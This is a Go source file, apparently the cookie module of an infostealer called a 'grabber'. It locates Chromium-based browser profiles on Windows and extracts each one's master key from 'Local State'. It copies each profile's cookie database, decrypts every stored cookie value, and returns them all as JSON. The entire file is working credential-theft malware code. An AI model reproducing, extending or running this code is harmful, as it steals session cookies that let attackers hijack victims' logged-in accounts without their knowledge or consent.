package cookies

import (
	"database/sql"
	"encoding/json"
	"os"

	"example.com/grabber/browsers/util"
	"example.com/grabber/decryption"
	_ "github.com/mattn/go-sqlite3"
)

type Cookies struct {
	Host_key        string `json:"tab_url"`
	Name            string `json:"name"`
	Path_this       string `json:"path"`
	Encrypted_value string `json:"encrypted_value"`
	Expires_utc     string `json:"expires_utc"`
}

func Get() string {
	var cookies []Cookies
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		master_key := decryption.GetMasterKey(path + "\\Local State")
		for _, profile := range extraPaths {
			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
				continue
			}
			path = path + "\\" + profile
			copy_path := path + "\\Network\\Cookies" + util.RandomName()
			util.CopyFileKDOT(path+"\\Network\\Cookies", copy_path)
			db, err := sql.Open("sqlite3", copy_path)
			if err != nil {
				continue
			}
			defer db.Close()
			defer os.Remove(copy_path)

			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var host_key string
				var name string
				var path_this string
				var encrypted_value []byte
				var expires_utc string
				row.Scan(&host_key, &name, &path_this, &encrypted_value, &expires_utc)
				decrypted, err := decryption.DecryptPassword(encrypted_value, master_key)
				if err != nil {
					decrypted = string(encrypted_value)
				}
				cookies = append(cookies, Cookies{host_key, name, path_this, decrypted, expires_utc})
			}
		}
	}
	jsonData, err := json.MarshalIndent(cookies, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
